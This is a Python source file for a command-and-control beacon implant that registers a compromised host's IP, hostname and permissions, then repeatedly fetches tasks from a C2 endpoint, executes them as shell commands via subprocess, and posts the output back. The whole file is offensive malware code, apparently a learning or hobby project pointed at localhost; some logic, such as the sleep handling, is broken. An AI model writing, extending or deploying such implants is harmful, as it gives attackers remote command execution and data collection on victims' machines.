from Classes import Beacon, Agent
import requests
import uuid
import time
from flask import jsonify
import subprocess

beacon_id = str(uuid.uuid4())
output_data = ""
sleep_time = 10

def initial_breach():
    beacon = Beacon(agent=None, beacon_id=beacon_id)
    beacon.get_ip()
    beacon.get_hostname()
    beacon.get_permissions()
    print(f"Registering beacon with IP: {beacon.remote_ip}, Hostname: {beacon.remote_hostname}, Permissions: {beacon.remote_permissions}, Beacon ID: {beacon.beacon_id}")
    beacon.register_beacon()
    
def fetch_tasks(beacon_id):  
    r = requests.get(f"http://localhost/c2/read_task?beacon_id={beacon_id}")
    if r.status_code == 200:
        task = r.json().get('data', {}).get ('tasks', [])
        result = subprocess.run([task], capture_output=True, text=True, check=True)

        return result.stdout if result.returncode == 0 else result.stderr
    else:
        task = None


    if task and 'sleep' in task:
        sleep_time = int(task.split()[1])
        return sleep_time

    return None

def send_output(beacon_id, output_data):
    if output_data:
        requests.post("http://localhost/c2/return_beacon_data", json={"beacon_id": beacon_id, "output": output_data})


def main():
    while True:
        output = fetch_tasks(beacon_id)
        send_output(beacon_id, output)  
        time.sleep(sleep_time)


if __name__ == "__main__":
    initial_breach()
    main()